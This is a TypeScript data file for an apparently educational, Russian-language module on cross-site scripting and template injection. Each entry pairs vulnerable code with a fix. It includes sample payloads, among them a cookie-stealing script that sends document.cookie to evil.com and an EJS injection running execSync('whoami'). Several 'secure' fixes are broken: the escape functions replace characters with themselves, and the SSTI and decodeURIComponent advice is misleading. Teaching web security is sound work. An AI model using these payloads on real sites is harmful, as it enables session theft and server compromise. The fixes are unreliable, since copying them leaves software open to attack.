// XSS Types and Data

export interface XSSType {
  id: string;
  title: string;
  description: string;
  vulnerableCode: string;
  secureCode: string;
  attackDemo: string;
  mitigation: string;
}

export const xssTypes: XSSType[] = [
  {
    id: 'reflected',
    title: 'Отражённый XSS (Reflected XSS)',
    description:
      'Отражённый XSS возникает, когда вредоносный скрипт встраивается в ответ сервера как результат запроса, содержащего внедрённый код. Скрипт «отражается» от сервера к пользователю через URL-параметры, формы или заголовки.',
    vulnerableCode: `<!-- УЯЗВИМЫЙ КОД -->
<div>
  Результаты поиска для:
  <span id="search-result"></span>
</div>

<script>
  // Ввод пользователя вставляется напрямую без санитизации
  document.getElementById('search-result').innerHTML =
    new URLSearchParams(location.search).get('q');
  // Атака: ?q=<script>alert('XSS')</script>
  // Или: ?q=<img src=x onerror=alert('XSS')>
</script>`,
    secureCode: `<!-- БЕЗОПАСНЫЙ КОД -->
<div>
  Результаты поиска для:
  <span id="search-result"></span>
</div>

<script>
  // Используем textContent вместо innerHTML
  const query = new URLSearchParams(location.search).get('q');
  document.getElementById('search-result').textContent = query;

  // Или с серверной санитизацией (Node.js)
  const escapeHTML = (str) => str
    .replace(/&/g, '&')
    .replace(/</g, '<')
    .replace(/>/g, '>')
    .replace(/"/g, '"')
    .replace(/'/g, '&#039;');
</script>`,
    attackDemo: '<script>alert("XSS-атака выполнена!")</script>',
    mitigation: 'Используйте textContent вместо innerHTML, кодируйте спецсимволы, применяйте Content Security Policy (CSP).',
  },
  {
    id: 'stored',
    title: 'Хранимый XSS (Stored XSS)',
    description:
      'Хранимый XSS — наиболее опасный тип, при котором вредоносный скрипт сохраняется на сервере (в базе данных, логах, комментариях) и выполняется при каждом отображении страницы. В отличие от отражённого XSS, жертве не нужно переходить по специальной ссылке — достаточно просто открыть страницу.',
    vulnerableCode: `<!-- УЯЗВИМЫЙ КОД — комментарии -->
<div class="comments">
  <!-- Комментарии из базы данных -->
  <div class="comment">
    <strong>Пользователь</strong>
    <p>{{comment.text}}</p>
    <!-- Если в comment.text содержится:
         <script>stealCookies()</script>
         Он будет выполнен для КАЖДОГО посетителя!
    -->
  </div>
</div>

<!-- Express.js backend -->
app.post('/api/comments', (req, res) => {
  // Сохраняем комментарий без санитизации
  db.query('INSERT INTO comments (text) VALUES (?)',
    [req.body.text]);
});`,
    secureCode: `<!-- БЕЗОПАСНЫЙ КОД -->
<div class="comments">
  <div class="comment">
    <strong>Пользователь</strong>
    <!-- Используем HTML-кодирование -->
    <p>{{escapeHTML(comment.text)}}</p>
  </div>
</div>

<!-- Backend с санитизацией -->
const DOMPurify = require('dompurify');
app.post('/api/comments', (req, res) => {
  // Санитизируем HTML перед сохранением
  const cleanText = DOMPurify.sanitize(req.body.text, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: []
  });
  db.query('INSERT INTO comments (text) VALUES (?)', [cleanText]);
});`,
    attackDemo: '<script>document.location="https://evil.com/steal?cookie="+document.cookie</script>',
    mitigation: 'Санитизируйте ввод перед сохранением в БД. Используйте DOMPurify для очистки HTML. Применяйте CSP заголовки.',
  },
  {
    id: 'dom',
    title: 'DOM-based XSS',
    description:
      'DOM-based XSS возникает, когда уязвимость находится в клиентском JavaScript-коде, который модифицирует DOM-дерево на основе данных из ненадёжного источника. В отличие от отражённого и хранимого XSS, вредоносный код вообще не отправляется на сервер — вся атака происходит в браузере.',
    vulnerableCode: `// УЯЗВИМЫЙ КОД — на стороне клиента
// Чтение данных из location.hash (фрагмента URL)
const userInput = location.hash.substring(1);

// Опасно — вставка HTML через innerHTML
document.getElementById('welcome').innerHTML =
  'Добро пожаловать, ' + userInput + '!';

// Атака: #<img src=x onerror=alert('XSS')>
// Результат: <div id="welcome">
//   Добро пожаловать, <img src=x onerror=alert('XSS')>!
// </div>

// Другие опасные источники:
// - document.referrer
// - document.cookie
// - window.name
// - localStorage/sessionStorage
// - postMessage`,
    secureCode: `// БЕЗОПАСНЫЙ КОД
const userInput = location.hash.substring(1);

// Вариант 1: Использовать textContent
document.getElementById('welcome').textContent =
  'Добро пожаловать, ' + userInput + '!';

// Вариант 2: Кодирование спецсимволов
function escapeHTML(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

document.getElementById('welcome').innerHTML =
  'Добро пожаловать, ' + escapeHTML(userInput) + '!';

// Вариант 3: Использовать URI-кодирование
const safeInput = decodeURIComponent(userInput);
// Всегда валидируйте входные данные!`,
    attackDemo: '#<img src=x onerror="document.body.style.background=\'red\'">',
    mitigation: 'Используйте textContent, а не innerHTML. Кодируйте данные из location.hash, document.referrer и других клиентских источников.',
  },
  {
    id: 'event-handler',
    title: 'XSS через обработчики событий',
    description:
      'Использование HTML-атрибутов событий (onerror, onclick, onload) для выполнения JavaScript. Часто обходит простые фильтры тегов <script>.',
    vulnerableCode: `<!-- УЯЗВИМЫЙ КОД — загрузка пользовательского контента -->
<img src="{{userInput}}" alt="Картинка">

<!-- Если userInput = "x onerror="alert('XSS')" -->
<!-- Итог: <img src="x onerror="alert('XSS')" alt="Картинка"> -->
<!-- Сработает событие onerror, так как картинка "x" не существует -->

<!-- Другие опасные атрибуты: -->
<div onclick="{{userInput}}">Нажми меня</div>
<body onload="{{userInput}}">
<input onfocus="{{userInput}}" autofocus>`,
    secureCode: `<!-- БЕЗОПАСНЫЙ КОД — санитизация атрибутов -->
const escapeAttr = (str) => str
  .replace(/&/g, '&')
  .replace(/"/g, '"')
  .replace(/'/g, '&#039;')
  .replace(/</g, '<')
  .replace(/>/g, '>');

<img src="{{escapeAttr(userInput)}}" alt="Картинка">

// Или используйте библиотеки санитизации
const DOMPurify = require('dompurify');
const clean = DOMPurify.sanitize(userInput, {
  ADD_TAGS: ['img'],
  ADD_ATTR: ['src', 'alt'],
  ALLOWED_TAGS: ['img']
});`,
    attackDemo: 'x onerror="alert(\'XSS через onerror\')"',
    mitigation: 'Экранируйте атрибуты. Используйте whitelist для разрешённых тегов и атрибутов. Отключите inline-события через CSP.',
  },
  {
    id: 'svg',
    title: 'XSS через SVG и MathML',
    description:
      'SVG и MathML могут содержать JavaScript и использоваться для обхода фильтров. Эти теги поддерживают события и могут выполнять код.',
    vulnerableCode: `<!-- УЯЗВИМЫЙ КОД — отображение SVG от пользователей -->
<div class="user-content">
  {{{userHTML}}}
</div>

<!-- Атака 1: SVG с событием -->
<svg onload="alert('XSS через SVG')">
  <circle cx="50" cy="50" r="40" fill="red"/>
</svg>

<!-- Атака 2: SVG с script -->
<svg>
  <script>alert('XSS в SVG')</script>
</svg>

<!-- Атака 3: SVG с animation -->
<svg>
  <animate onbegin="alert('XSS')" attributeName="x" from="0" to="100"/>
</svg>`,
    secureCode: `<!-- БЕЗОПАСНЫЙ КОД — фильтрация SVG -->
const DOMPurify = require('dompurify');

// Отключите выполнение скриптов в SVG
const clean = DOMPurify.sanitize(userHTML, {
  USE_PROFILES: { svg: true, svgFilters: true },
  ADD_TAGS: [],
  ADD_ATTR: [],
  ALLOWED_TAGS: ['svg', 'circle', 'rect', 'text'],
  ALLOWED_ATTR: ['cx', 'cy', 'r', 'x', 'y', 'fill', 'width', 'height']
  // НЕТ on*, script, animate
});

// Или полностью отключите SVG
const clean = DOMPurify.sanitize(userHTML, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br']
});`,
    attackDemo: '<svg onload="alert(\'XSS через SVG\')">',
    mitigation: 'Используйте DOMPurify с профилем SVG. Отключите события и скрипты. Лучше вообще не разрешать SVG от пользователей.',
  },
  {
    id: 'data-uri',
    title: 'XSS через data: URI',
    description:
      'Использование data: URI для встраивания JavaScript непосредственно в атрибуты href или src.',
    vulnerableCode: `<!-- УЯЗВИМЫЙ КОД — отображение пользовательских ссылок -->
<a href="{{userLink}}">Перейти</a>

<!-- Атака 1: data:text/html с скриптом -->
<a href="data:text/html,<script>alert('XSS')</script>">Нажми меня</a>

<!-- Атака 2: JavaScript: URI -->
<a href="javascript:alert('XSS')">Нажми меня</a>

<!-- Атака 3: через image -->
<img src="data:image/svg+xml,<svg onload='alert("XSS")'/>">`,
    secureCode: `<!-- БЕЗОПАСНЫЙ КОД — валидация URL -->
function validateUrl(url) {
  const allowedProtocols = ['https:', 'http:', 'mailto:'];
  try {
    const parsed = new URL(url);
    return allowedProtocols.includes(parsed.protocol);
  } catch {
    return false;
  }
}

// В шаблоне
{{#if (validateUrl userLink)}}
  <a href="{{userLink}}">Перейти</a>
{{else}}
  <span>Некорректная ссылка</span>
{{/if}}

// Или используйте CSP
// Content-Security-Policy: default-src 'self'; script-src 'self'`,
    attackDemo: 'javascript:alert(\'XSS через javascript:\')',
    mitigation: 'Валидируйте протоколы URL. Запретите javascript:, data:, vbscript:. Используйте CSP с block-all-mixed-content.',
  },
  {
    id: 'template-injection',
    title: 'Server-Side Template Injection (SSTI)',
    description:
      'Серверная инъекция в шаблоны возникает, когда пользовательский ввод подставляется в шаблонный движок без санитизации. Может привести к выполнению кода на сервере.',
    vulnerableCode: `// УЯЗВИМЫЙ КОД — Express с EJS
app.get('/greet', (req, res) => {
  const name = req.query.name;
  // Прямая подстановка в шаблон
  res.render('greeting', { name: name });
});

// greeting.ejs
<h1>Привет, <%= name %></h1>

// Атака (Node.js):
// /greet?name=<%= process.mainModule.require('child_process').execSync('whoami') %>

// Или с Twig (PHP):
// /greet?name={{config.system.class.__construct().__autoload('phpinfo') }}`,
    secureCode: `// БЕЗОПАСНЫЙ КОД — escape по умолчанию
app.get('/greet', (req, res) => {
  const name = req.query.name;
  // EJS по умолчанию экранирует, используем безопасную синтаксис
  res.render('greeting', { name });
});

// greeting.ejs — используйте <%- %>, только для доверенного контента
<h1>Привет, <%= name %></h1>

// Валидация ввода
const name = req.query.name.replace(/[<>"'&]/g, '');
if (name.length > 50) {
  return res.status(400).send('Имя слишком длинное');
}

// Или используйте safer шаблонизаторы
const handlebars = require('handlebars');
handlebars.escapeExpression(userInput); // Всегда экранирует`,
    attackDemo: '<%= process.mainModule.require("child_process").execSync("whoami") %>',
    mitigation: 'Никогда не используйте <%- %> для пользовательского ввода. Валидируйте входные данные. Используйте безопасные шаблонизаторы.',
  },
];